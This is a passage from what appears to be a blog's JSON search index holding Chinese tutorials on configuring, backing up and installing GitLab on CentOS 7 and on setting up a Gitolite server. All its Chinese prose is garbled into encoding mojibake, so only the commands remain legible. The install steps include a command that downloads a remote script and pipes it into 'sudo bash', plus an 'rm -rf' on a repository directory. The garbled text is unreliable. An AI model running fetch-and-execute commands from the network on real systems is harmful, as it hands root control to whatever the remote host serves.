"keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Git ä¹‹å…« - Gitlab è¯¦ç»†ä½¿ç”¨æ•™ç¨‹",url:"/posts/79923b91.html",text:'ä¸Šç¯‡ - Git ä¹‹ä¸ƒ - Centos7 æ­å»º Gitlab æœåŠ¡å™¨ Gitlab å¸¸è§„é…ç½® 12345678910111213141516171819202122232425262728# ç¼–è¾‘Gitlabçš„é…ç½®æ–‡ä»¶# vim /etc/gitlab/gitlab.rb# é…ç½®unicornçš„ç«¯å£ï¼ˆé»˜è®¤8080ï¼‰ï¼Œæ³¨æ„ä¸è¦ç”¨8082ã€9090ç«¯å£ï¼Œå› ä¸ºè‡ªå¸¦å·¥å…·ä¼šå ç”¨unicorn[\'port\'] = 9999# é…ç½®Gitlabçš„é»˜è®¤å¤‡ä»½è·¯å¾„gitlab_rails[\'backup_path\'] = "/var/opt/gitlab/backups"# é…ç½®é‚®ä»¶å‘é€gitlab_rails[\'smtp_enable\'] = truegitlab_rails[\'smtp_address\'] = "smtp.exmail.qq.com"gitlab_rails[\'smtp_port\'] = 25gitlab_rails[\'smtp_user_name\'] = "huangdc@domain.com"gitlab_rails[\'smtp_password\'] = "smtp password"gitlab_rails[\'smtp_authentication\']= "plain"gitlab_rails[\'smtp_enable_starttls_auto\']= truegitlab_rails[\'gitlab_email_from\']= "huangdc@domain.com"gitlab_rails[\'gitlab_email_reply_to\']= "noreply@domain.com"# é…ç½®SSHçš„ç«¯å£ï¼ˆé»˜è®¤22ï¼‰ï¼Œä¿®æ”¹ä¹‹åGitlabä¸­é¡¹ç›®çš„SSHåœ°å€ä¼šåœ¨å‰é¢åŠ ä¸Šåè®®å¤´å’Œç«¯å£å·ï¼Œä¾‹å¦‚â€œssh://git@192.168.1.198:55725/lisi/test.gitâ€gitlab_rails[\'gitlab_shell_ssh_port\'] = 55725# é‡æ–°ç¼–è¯‘Gitlabçš„é…ç½®# gitlab-ctl reconfigure# é‡å¯GitLab# gitlab-ctl restart Gitlab å®šæ—¶å¤‡ä»½ 123456# æ·»åŠ å®šæ—¶å¤‡ä»½ä»»åŠ¡ï¼Œcrontabè¡¨è¾¾å¼æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œä¿®æ”¹ï¼Œæœ€åwqå­˜ç›˜é€€å‡ºcrontabçš„ç¼–è¾‘çŠ¶æ€# crontab -e0 2 * * * /usr/bin/gitlab-rake gitlab:backup:create CRON=1# æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡æ˜¯å¦æ·»åŠ æˆåŠŸ# crontab -l Gitlab æ¢å¤å¤‡ä»½ 12345678910111213# åœæ­¢unicornå’Œsidekiqï¼Œä¿è¯æ•°æ®åº“æ²¡æœ‰æ–°çš„è¿æ¥ï¼Œä¸ä¼šæœ‰æ–°çš„æ•°æ®å†™å…¥# gitlab-ctl stop unicorn# gitlab-ctl stop sidekiq# è¿›å…¥gitlabçš„å¤‡ä»½ç›®å½•# cd /var/opt/gitlab/backups# æ¢å¤æŒ‡å®šçš„å¤‡ä»½æ–‡ä»¶ï¼Œ1547096290_2019_01_10_11.6.3æ˜¯å¤‡ä»½æ–‡ä»¶çš„ç¼–å·# gitlab-rake gitlab:backup:restore BACKUP=1547096290_2019_01_10_11.6.3# å¯åŠ¨unicornå’Œsidekiq# gitlab-ctl start unicorn# gitlab-ctl start sidekiq var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç‰ˆæœ¬æ§åˆ¶"},{title:"Git ä¹‹ä¸ƒ - Centos7 æ­å»º Gitlab æœåŠ¡å™¨",url:"/posts/37ea711c.html",text:'Gitlab ç›¸å…³ç«™ç‚¹ Gitlab å®˜ç½‘ Gitlab CE Github Gitlab å®˜æ–¹å®‰è£…æ•™ç¨‹ Gitlab CE å®˜æ–¹æ–‡æ¡£ å®‰è£… Gitlab æ‰€éœ€çš„æœ€ä½ç¡¬ä»¶é…ç½®è¯´æ˜ Gitlab ä»‹ç» GitLab æ˜¯åŸºäº Ruby on Rails çš„ä¸€ä¸ªå¼€æºç‰ˆæœ¬ç®¡ç†ç³»ç»Ÿï¼Œå®ç°ä¸€ä¸ªè‡ªæ‰˜ç®¡çš„ Git é¡¹ç›®ä»“åº“ï¼Œå¯é€šè¿‡ Web ç•Œé¢è¿›è¡Œè®¿é—®å…¬å¼€çš„æˆ–è€…ç§äººé¡¹ç›®ã€‚GitLab åˆ†ä¸ºç¤¾åŒºç‰ˆï¼ˆCEï¼‰ å’Œä¼ä¸šç‰ˆï¼ˆEEï¼‰ã€‚å®ƒæ‹¥æœ‰ä¸ Github ç±»ä¼¼çš„åŠŸèƒ½ï¼Œèƒ½å¤Ÿæµè§ˆæºä»£ç ï¼Œç®¡ç†ç¼ºé™·å’Œæ³¨é‡Šã€‚å¯ä»¥ç®¡ç†å›¢é˜Ÿå¯¹ä»“åº“çš„è®¿é—®ï¼Œå®ƒéå¸¸æ˜“äºæµè§ˆæäº¤è¿‡çš„ç‰ˆæœ¬å¹¶æä¾›ä¸€ä¸ªæ–‡ä»¶å†å²åº“ã€‚å›¢é˜Ÿæˆå‘˜å¯ä»¥åˆ©ç”¨å†…ç½®çš„ç®€å•èŠå¤©ç¨‹åº (Wall) è¿›è¡Œäº¤æµã€‚ä¾èµ–ç»„ä»¶ï¼šRubyã€Gitã€Nginxã€Redisã€Sidekiqã€GitLab Runnerã€Unicorn Workersã€PostgreSQL/MySQL/MariaDB ç­‰ï¼Œå…¶ä¸­ MySQL/MariaDB å¹¶ä¸å®Œå…¨æ”¯æŒ Gitlab çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå®˜æ–¹å¼ºçƒˆæ¨èå®‰è£… PostgreSQLã€‚ å®‰è£…ç¯å¢ƒè¯´æ˜ 12345$ uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux$ cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core) å®‰è£…å¹¶é…ç½®å¿…è¦çš„ä¾èµ–é¡¹ 123456789101112131415161718192021222324# å®‰è£…ä¾èµ–é¡¹# yum install -y curl policycoreutils-python openssh-server# é…ç½®SSHæœåŠ¡å¼€æœºè‡ªå¯åŠ¨# systemctl enable sshd# å¯åŠ¨SSHæœåŠ¡# systemctl start sshd# æŸ¥çœ‹é˜²ç«å¢™è¿è¡ŒçŠ¶æ€# firewall-cmd --state# å¦‚æœé˜²ç«å¢™æœåŠ¡å¤„äºå…³é—­çŠ¶æ€ï¼Œåˆ™å¯ç”¨é˜²ç«å¢™æœåŠ¡# systemctl start firewalld# é…ç½®é˜²ç«å¢™å¼€æ”¾HTTPæœåŠ¡ï¼ˆ80ç«¯å£ï¼‰# firewall-cmd --permanent --add-service=http# ä¿å­˜é˜²ç«å¢™é…ç½®# systemctl reload firewalld# æŸ¥çœ‹é˜²ç«å¢™å·²å¼€æ”¾çš„æœåŠ¡ï¼Œé˜²ç«å¢™é»˜è®¤ä¼šå¼€æ”¾SSHæœåŠ¡ï¼ˆ22ç«¯å£ï¼‰# firewall-cmd --list-servicesdhcpv6-client ssh http å®‰è£… Postfixï¼Œç”¨äºå‘é€é€šçŸ¥é‚®ä»¶ 12345678# å®‰è£…Postfix# yum install postfix# é…ç½®PostfixæœåŠ¡å¼€æœºè‡ªå¯åŠ¨# systemctl enable postfix# å¯åŠ¨PostfixæœåŠ¡# systemctl start postfix Yum æ–¹å¼å®‰è£… Gitlab 1234567891011121314151617# æ·»åŠ Yumä»“åº“# curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bash# å®‰è£…Gitlabï¼ŒEXTERNAL_URLæ˜¯æŒ‡ç”¨äºå¤–éƒ¨è®¿é—®Gitlabçš„åŸŸåæˆ–è€…URLåœ°å€ï¼Œå®‰è£…åŒ…çš„ä½“ç§¯çº¦447M# EXTERNAL_URL="http://192.168.1.198" yum install -y gitlab-ce# ç¼–è¯‘Gitlabçš„é…ç½®ä¸å¯åŠ¨Gitlabï¼Œé¦–æ¬¡æ‰§è¡Œè€—æ—¶è¾ƒé•¿# gitlab-ctl reconfigure# æŸ¥çœ‹gitlabå„ç»„ä»¶æ˜¯å¦å¯åŠ¨æˆåŠŸ# gitlab-ctl status# æŸ¥çœ‹å·²å®‰è£…çš„Gitlabçš„ç‰ˆæœ¬# cat /opt/gitlab/embedded/service/gitlab-rails/VERSION# æµ‹è¯•Gitlabæ˜¯å¦å®‰è£…å¹¶å¯åŠ¨æˆåŠŸï¼Œæµè§ˆå™¨è¾“å…¥ä»¥ä¸‹URLè®¿é—®Gitlabï¼Œåˆæ¬¡è®¿é—®Gitlabéœ€è¦åœ¨Webç•Œé¢é…ç½®rootç”¨æˆ·çš„å¯†ç ï¼Œç„¶åä½¿ç”¨rootç”¨æˆ·è¿›è¡Œç™»å½•http://192.168.1.198 é…ç½® Gitlab çš„ Nginx ç«¯å£ 1234567891011121314151617181920212223# ä¸èƒ½é€šè¿‡ç¼–è¾‘Nginxé…ç½®æ–‡ä»¶çš„æ–¹å¼æ¥ä¿®æ”¹Gitlabçš„Nginxç«¯å£ï¼Œå› ä¸ºé‡æ–°ç¼–è¯‘Gitlabçš„é…ç½®åï¼ŒNginxçš„é…ç½®æ–‡ä»¶/var/opt/gitlab/nginx/conf/gitlab-http.confä¼šè¢«é‡æ–°è¦†ç›–# ç¼–è¾‘Gitlabçš„é…ç½®æ–‡ä»¶# vim /etc/gitlab/gitlab.rb# ä¿®æ”¹Gitlabçš„Nginxç«¯å£ï¼ˆé»˜è®¤80ï¼‰ï¼Œæ³¨æ„ä¸è¦ç”¨8082ç«¯å£ï¼Œå› ä¸ºè‡ªå¸¦å·¥å…·å¯èƒ½ä¼šå ç”¨nginx[\'listen_port\'] = 8888external_url \'http://192.168.1.198:8888\'# é‡æ–°ç¼–è¯‘Gitlabçš„é…ç½®ï¼ŒNginxé…ç½®æ–‡ä»¶ä¸­çš„listenã€server_nameã€http_host_with_defaulté…ç½®é¡¹çš„å€¼ä¼šè‡ªåŠ¨æ›´æ–°# gitlab-ctl reconfigure# é‡å¯GitLab# gitlab-ctl restart# é…ç½®é˜²ç«å¢™æ°¸ä¹…å¼€æ”¾ä¿®æ”¹åçš„Nginxç«¯å£# firewall-cmd --zone=public --permanent --add-port=8888/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# firewall-cmd --reload# æŸ¥çœ‹é˜²ç«å¢™å·²å¼€æ”¾çš„ç«¯å£# firewall-cmd --list-ports Gitlab å¸¸ç”¨ç›®å½•ä¸é…ç½®æ–‡ä»¶ä»‹ç» 1234567891011# å¯¹åº”Gitlabå„æœåŠ¡çš„ä¸»ç›®å½•ï¼ŒåŒæ—¶ä¹Ÿæ˜¯Gitlabçš„æ•°æ®ç›®å½•# ls /var/opt/gitlab# å¯¹åº”å„æœåŠ¡çš„æ—¥å¿—ç›®å½•# ls /var/log/gitlab# é…ç½®æ–‡ä»¶-Gitlab# cat /etc/gitlab/gitlab.rb# é…ç½®æ–‡ä»¶-Nginx# cat /var/opt/gitlab/nginx/conf/gitlab-http.conf Gitlab å¸¸ç”¨å‘½ä»¤ä»‹ç» 1234567891011121314151617181920212223242526272829# å¯åŠ¨æ‰€æœ‰gitlabç»„ä»¶# gitlab-ctl start# åœæ­¢æ‰€æœ‰gitlabç»„ä»¶# gitlab-ctl stop# é‡å¯æ‰€æœ‰gitlabç»„ä»¶# gitlab-ctl restart# æŸ¥çœ‹gitlabå„ç»„ä»¶çš„è¿è¡ŒçŠ¶æ€# gitlab-ctl status# é‡å¯æŸä¸ªç»„ä»¶# gitlab-ctl restart nginx# æŸ¥çœ‹æŸä¸ªç»„ä»¶çš„è¿è¡ŒçŠ¶æ€# gitlab-ctl status nginx# é‡æ–°ç¼–è¯‘gitlabçš„é…ç½®# gitlab-ctl reconfigure# æŸ¥çœ‹gitlabçš„æ—¥å¿—# gitlab-ctl tail# æŸ¥çœ‹nginxçš„æ—¥å¿—# gitlab-ctl tail nginx/gitlab_access.log# æ£€æŸ¥gitlab# gitlab-rake gitlab:check SANITIZE=true --trace ä¸‹ç¯‡ - Git ä¹‹å…« - Gitlab è¯¦ç»†ä½¿ç”¨æ•™ç¨‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç‰ˆæœ¬æ§åˆ¶ centos"},{title:"Git ä¹‹å…­ - ä½¿ç”¨ Gitolite æ­å»º Git æœåŠ¡å™¨",url:"/posts/3a44097a.html",text:'Gitolite Github Repo https://github.com/sitaramc/gitolite Gitolite ä»‹ç» Gitolite æ˜¯ä¸€æ¬¾ Perl è¯­è¨€å¼€å‘çš„ Git æœåŠ¡ç®¡ç†å·¥å…·ï¼Œé‡‡ç”¨çš„æ˜¯ SSH åè®®å¹¶ä½¿ç”¨ SSH å…¬é’¥è®¤è¯ï¼Œèƒ½å¤Ÿé€šè¿‡é…ç½®æ–‡ä»¶å¯¹å†™æ“ä½œè¿›è¡ŒåŸºäºåˆ†æ”¯å’Œè·¯å¾„çš„ç²¾ç»†æˆæƒã€‚ å®‰è£…ç¯å¢ƒè¯´æ˜ 12345$ uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux$ cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core) å®‰è£…åŸºç¡€ä¾èµ–åŒ… 12345# åˆ‡æ¢åˆ°Rootç”¨æˆ·$ su - root# å®‰è£…ä¾èµ–åŒ…# yum install -y autoconf git gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel tree åˆ›å»º Git ç”¨æˆ· 1234567# å¦‚æœGitç”¨æˆ·å·²å­˜åœ¨åˆ™æ— éœ€å†åˆ›å»ºï¼ŒåŠ¡å¿…ç¡®è®¤/home/git/.ssh/authorized_keysæ–‡ä»¶çš„å†…å®¹ä¸ºç©ºæˆ–è€…ä¸å­˜åœ¨# åˆ›å»ºGitç”¨æˆ·# adduser git# è®¾ç½®Gitç”¨æˆ·çš„å¯†ç # passwd git åˆ›å»º Root ç”¨æˆ·çš„ SSH å…¬é’¥ / ç§é’¥å¯¹ 1234567891011# è¿›å…¥Rootç”¨æˆ·å®¶ç›®å½•ä¸‹çš„.sshç›®å½•# cd /root/.ssh# æŸ¥çœ‹æ˜¯å¦å­˜åœ¨SSHå…¬é’¥/ç§é’¥å¯¹# ls -al# å¦‚æœä¸å­˜åœ¨SSHå…¬é’¥/ç§é’¥å¯¹ï¼Œåˆ™æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œåˆ›å»ºï¼Œç„¶åä¸€è·¯å›è½¦åˆ°ç»“æŸ# ssh-keygen# å°†Rootç”¨æˆ·çš„SSHå…¬é’¥æ–‡ä»¶å¤åˆ¶åˆ°Gitç”¨æˆ·çš„å®¶ç›®å½•ä¸‹ï¼Œå»ºè®®å…¬é’¥æ–‡ä»¶ä½¿ç”¨å…·æœ‰æ ‡è¯†æ€§çš„æ–‡ä»¶åç§°ï¼Œä¾¿äºå¤šäººåä½œå¼€å‘æ—¶åŒºåˆ†ä¸åŒçš„å®¢æˆ·ç«¯ç”¨æˆ·# cp id_rsa.pub /home/git/sk.pub å®‰è£… Gitolite 1234567891011121314151617181920212223242526272829# åˆ‡æ¢åˆ°Gitç”¨æˆ·# su - git# ç¡®ä¿å½“å‰ä½ç½®æ˜¯åœ¨Gitç”¨æˆ·çš„å®¶ç›®å½•ï¼ˆ/home/gitï¼‰ä¸‹$ pwd# æ›´æ–°Bash$ source .bash_profile# åˆ›å»ºä¸€ä¸ªåç§°ä¸ºbinçš„ç›®å½•$ mkdir bin# å…‹éš†Gitoliteæºç $ git clone git://github.com/sitaramc/gitolite# åœ¨binç›®å½•ä¸‹åˆ›å»ºGitoliteç¬¦å·é“¾æ¥ï¼Œå¿…é¡»ä½¿ç”¨ç›¸å¯¹è·¯å¾„$ gitolite/install -ln ~/bin# ä½¿ç”¨Rootç”¨æˆ·çš„SSHå…¬é’¥æ–‡ä»¶å®‰è£…Gitoliteï¼Œåœ¨æœåŠ¡å™¨ä¸­Gitoliteé€šå¸¸æ˜¯ç”±ä¸€ä¸ªéRootç”¨æˆ·å®‰è£…çš„ï¼Œä¸€èˆ¬æ˜¯ä½¿ç”¨Gitç”¨æˆ·$ gitolite setup -pk sk.pub# å®‰è£…å®Œæˆå/home/gitç›®å½•çš„ç»“æ„å¦‚ä¸‹$ tree -L 1 /home/git/home/gitâ”œâ”€â”€ binâ”œâ”€â”€ gitoliteâ”œâ”€â”€ projects.listâ”œâ”€â”€ repositoriesâ””â”€â”€ sk.pub éªŒè¯ Gitolite æ˜¯å¦å®‰è£…æˆåŠŸ 12345678910111213141516# åˆ‡æ¢åˆ°Rootç”¨æˆ·$ su - root# ç¡®ä¿å½“å‰ä½ç½®æ˜¯åœ¨Rootç”¨æˆ·çš„å®¶ç›®å½•ï¼ˆ/rootï¼‰ä¸‹# pwd# æµ‹è¯•ä»æ–°å®‰è£…çš„GitoliteæœåŠ¡å™¨ä¸­å…‹éš†gitolite-adminä»“åº“ï¼Œç»ˆç«¯ä¼šæç¤ºè¾“å…¥Rootç”¨æˆ·çš„å¯†ç ï¼Œç”±äºä¸Šé¢å·²ç»äº¤æ¢äº†Rootç”¨æˆ·çš„SSHå…¬é’¥æ–‡ä»¶ï¼Œå› æ­¤åªéœ€è¦è¾“å…¥"yes"ï¼Œç„¶åè¾“å…¥å›è½¦é”®å³å¯# git clone git@127.0.0.1:gitolite-admin# æŸ¥çœ‹gitolite-adminä»“åº“çš„ç›®å½•ç»“æ„ï¼Œconfç›®å½•ç”¨äºå­˜æ”¾é…ç½®æ–‡ä»¶ï¼ˆæˆæƒæ–‡ä»¶ï¼‰ï¼ŒkeyDirç›®å½•ç”¨äºå­˜æ”¾æ‰€æœ‰å®¢æˆ·ç«¯ç”¨æˆ·çš„SSHå…¬é’¥æ–‡ä»¶# tree gitolite-admingitolite-adminâ”œâ”€â”€ confâ”‚ â””â”€â”€ gitolite.confâ””â”€â”€ keydir â””â”€â”€ sk.pub gitolite-admin ä»“åº“ä»‹ç» gitolite-admin ä»“åº“ç”¨äº Git ç®¡ç†å‘˜ç®¡ç† Git ä»“åº“ä¸åˆ†é… Git ä»“åº“æƒé™ï¼Œä»¥åæ¯æ¬¡æ–°å¢ä»“åº“ã€ä¿®æ”¹æƒé™ã€æ›´æ–°ç”¨æˆ· / ç”¨æˆ·ç»„ï¼Œéƒ½éœ€è¦åœ¨è¿™ä¸ª clone ä¸‹æ¥çš„ gitolite-admin ä»“åº“ä¸‹çš„ conf ç›®å½•ä¸­è¿›è¡Œé…ç½®ï¼›åŒæ—¶å°†å®¢æˆ·ç«¯ç”¨æˆ·çš„ SSH å…¬é’¥æ–‡ä»¶ä¸Šä¼ è‡³ keydir ç›®å½•ï¼ŒSSH å…¬é’¥æ–‡ä»¶çš„æ–‡ä»¶åä»¥å®¢æˆ·ç«¯ç”¨æˆ·åæ¥åŒºåˆ†ï¼›ç„¶åå°†æ–°å¢æˆ–ä¿®æ”¹çš„æ–‡ä»¶ push åˆ°ä»“åº“æœåŠ¡å™¨ï¼Œpush å®Œåå¯ä»¥çœ‹åˆ° /home/git/repositories ä¸‹æ–°åˆ›å»ºçš„ä»“åº“ã€‚ Gitolite ç®¡ç†ç¤ºä¾‹ - æ·»åŠ ã€ä¿®æ”¹ä»“åº“ 12345678910111213141516171819202122232425262728293031# æŸ¥çœ‹å½“å‰ç”¨æˆ·èº«ä»½ï¼Œç¡®ä¿å½“å‰ç”¨æˆ·èº«ä»½æ˜¯Rootç”¨æˆ·# whoami# è¿›å…¥gitolite-adminä»“åº“æ‰€åœ¨çš„ç›®å½•# cd /root/gitolite-admin# ç¼–è¾‘Gitoliteçš„é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨ä»¥ä¸‹æ ¼å¼é…ç½®ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€ä»“åº“ã€æƒé™ç­‰# vim conf/gitolite.conf# é…ç½®ç”¨æˆ·ç»„ï¼Œç»„æˆå‘˜åç§°å¿…é¡»ä¸keydirç›®å½•ä¸‹çš„SSHå…¬é’¥æ–‡ä»¶çš„æ–‡ä»¶åç›¸åŒ@ç»„å = ç”¨æˆ·å# é…ç½®ä»“åº“å/é¡¹ç›®åï¼Œå¦‚æœå¯¹åº”çš„ä»“åº“ä¸å­˜åœ¨ï¼Œæ‰§è¡ŒPushæ“ä½œä¹‹åä¼šè‡ªåŠ¨åˆ›å»ºå¹¶åˆå§‹åŒ–ä»“åº“repo demo# é…ç½®ä»“åº“æƒé™ï¼Œå¦‚æœæ˜¯å¤šä¸ªç”¨æˆ·ç»„/ç”¨æˆ·åï¼Œåˆ™ä½¿ç”¨ç©ºæ ¼éš”å¼€RW+ = @ç”¨æˆ·ç»„/ç”¨æˆ·å# å¦‚æœåœ¨Gitoliteçš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ äº†æ–°å®¢æˆ·ç«¯ç”¨æˆ·çš„é…ç½®å†…å®¹ï¼Œåˆ™éœ€è¦ä¸Šä¼ æ–°å®¢æˆ·ç«¯ç”¨æˆ·çš„SSHå…¬é’¥æ–‡ä»¶åˆ°gitolite-admin/keydirç›®å½•ä¸‹ã€‚åœ¨keydirç›®å½•ä¸‹ï¼Œå®¢æˆ·ç«¯ç”¨æˆ·çš„SSHå…¬é’¥æ–‡ä»¶çš„æ–‡ä»¶åå¿…é¡»ä¸conf/gitolite.confæ–‡ä»¶ä¸­æŒ‡å®šçš„å®¢æˆ·ç«¯ç”¨æˆ·åä¸€è‡´ï¼›ä¾‹å¦‚ç”¨æˆ·zhangsanï¼Œå…¶SSHå…¬é’¥æ–‡ä»¶çš„æ–‡ä»¶åå¿…é¡»æ˜¯zhangsan.pubã€‚è¿™é‡Œçš„ä½œç”¨ç±»ä¼¼åœ¨Linuxä¸­é…ç½®SSHå…å¯†ç ç™»å½•ã€‚# é…ç½®ä»“åº“ç­¾åï¼ˆåªéœ€åœ¨é¦–æ¬¡æ‰§è¡ŒPushæ“ä½œä¹‹å‰è¿›è¡Œé…ç½®ï¼‰# git config user.name gitolite-root# git config user.email xxx@qq.com# æ‰§è¡ŒPushæ“ä½œï¼Œä½¿é…ç½®ç”Ÿæ•ˆ# git add --all# git commit -am \'update gitolite config\'# git push origin master# å¦‚æœä¸Šè¿°é…ç½®ä¸­åŒ…å«äº†æ–°ä»“åº“çš„é…ç½®å†…å®¹ï¼Œé‚£ä¹ˆæˆåŠŸæ‰§è¡ŒPushæ“ä½œä¹‹åï¼Œå¯ä»¥åœ¨/home/git/repositoriesç›®å½•ä¸‹çœ‹åˆ°æ–°åˆ›å»ºçš„ä»“åº“ç›®å½•ï¼Œä¾‹å¦‚demo.git# ls -al /home/git/repositories Gitolite ç®¡ç†ç¤ºä¾‹ - åˆ é™¤ä»“åº“ 12345678910111213141516# æŸ¥çœ‹å½“å‰ç”¨æˆ·èº«ä»½ï¼Œç¡®ä¿å½“å‰ç”¨æˆ·èº«ä»½æ˜¯Rootç”¨æˆ·# whoami# è¿›å…¥gitolite-adminä»“åº“æ‰€åœ¨çš„ç›®å½•# cd /root/gitolite-admin# ç¼–è¾‘Gitoliteçš„é…ç½®æ–‡ä»¶ï¼Œåˆ é™¤å¯¹åº”ä»“åº“çš„ç›¸å…³é…ç½®å†…å®¹ï¼Œä¾‹å¦‚â€œrepo demoâ€# vim conf/gitolite.conf# æ‰§è¡ŒPushæ“ä½œ# git add --all# git commit -am \'update gitolite config\'# git push origin master# åœ¨æœåŠ¡å™¨ä¸Šæ‰‹åŠ¨åˆ é™¤/home/git/repositoriesç›®å½•ä¸‹å¯¹åº”çš„ä»“åº“ç›®å½•ï¼Œåˆ é™¤ç¤ºä¾‹å¦‚ä¸‹ï¼š# rm -rf /home/git/repositories/demo Git å®¢æˆ·ç«¯ï¼ˆè¿œç¨‹å®¢æˆ·ç«¯ï¼‰è¿æ¥ Gitolite æœåŠ¡å™¨çš„æ­¥éª¤æ€»ç»“ Git ç®¡ç†å‘˜åœ¨ gitolite-admin ä»“åº“é‡Œï¼Œé…ç½®å®¢æˆ·ç«¯ç”¨æˆ·è®¿é—®å¯¹åº”ä»“åº“çš„æƒé™ å®¢æˆ·ç«¯æœ¬åœ°ç”Ÿæˆ SSH å…¬é’¥æ–‡ä»¶ï¼Œå¹¶äº¤ç”± Git ç®¡ç†å‘˜ä¸Šä¼ åˆ° gitolite-admin/keydir ç›®å½•ä¸‹ å®¢æˆ·ç«¯ç›´æ¥ä½¿ç”¨ Git å‘½ä»¤å…‹éš†å¯¹åº”çš„è¿œç¨‹ä»“åº“ï¼Œä¾‹å¦‚ï¼š git clone git@ip:repo-name å…¶ä»– IDE (ä¾‹å¦‚ Eclipse) å…‹éš†å¯¹åº”çš„è¿œç¨‹ä»“åº“ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨åœ°å€ï¼š git@ip:repo-name git@ip:repo-nameï¼Œå…¶ä¸­ ip æ˜¯ Gitolite æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œrepo-name æ˜¯ Git è¿œç¨‹ä»“åº“çš„åç§° Gitolite é˜²ç«å¢™é…ç½®è¯´æ˜ ä½¿ç”¨ Gitolite æ­å»º Git æœåŠ¡å™¨ï¼Œç”±äº Gitolite é‡‡ç”¨çš„æ˜¯ SSH åè®®ï¼Œåªéœ€è¦ç¡®ä¿ç³»ç»Ÿå¼€å¯ SSH æœåŠ¡ï¼Œå¹¶ä¸”é˜²ç«å¢™å¼€æ”¾äº† SSH ç«¯å£ï¼ˆé»˜è®¤ 22ï¼‰å³å¯ã€‚ è§£å†³ Gitolite å®‰è£…ä¹‹åï¼Œæ— æ³•ä½¿ç”¨ git ç”¨æˆ·è¿›è¡Œ SSH è¿œç¨‹ç™»å½•çš„é—®é¢˜ å½“å®‰è£… Gitolite åï¼ŒGitolite å‡ºäºå®‰å…¨é—®é¢˜ç›´æ¥ç¦ç”¨äº† git ç”¨æˆ·çš„ SSH ç™»å½•æƒé™ï¼Œå› æ­¤æ˜¯æ— æ³•ç›´æ¥ä½¿ç”¨ git ç”¨æˆ·è¿œç¨‹ SSH è¿æ¥åˆ°æœåŠ¡å™¨çš„ï¼Œé»˜è®¤ä¼šæç¤ºä»¥ä¸‹é”™è¯¯ä¿¡æ¯ã€‚è§£å†³æ–¹æ³•æ˜¯å…ˆé€šè¿‡å…¶ä»– Linux ç”¨æˆ· SSH è¿œç¨‹è¿æ¥åˆ°æœåŠ¡å™¨ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤â€su - gitâ€ åˆ‡æ¢åˆ° git ç”¨æˆ·ã€‚ 123# ssh git@192.168.1.1PTY allocation request failed on channel 0hello centos7, this is git@192.168.1.1 running gitolite3 v3.6.10-2-g64aa53b on git 1.8.3.1 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux ç‰ˆæœ¬æ§åˆ¶"},{title:"Git ä¹‹äº” - æ·±å…¥ç†è§£ Git å·¥ä½œæµ",url:"/posts/1600ad43.html",text:'Git å·¥ä½œæµæ¦‚å¿µGit å·¥ä½œæµæŒ‡åœ¨é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨ Git çš„æ–¹å¼ï¼ŒåŒ…æ‹¬é›†ä¸­å¼å·¥ä½œæµã€åŠŸèƒ½åˆ†æ”¯å·¥ä½œæµã€GitFlow å·¥ä½œæµã€Forking å·¥ä½œæµã€Pull Requestsã€‚ Git 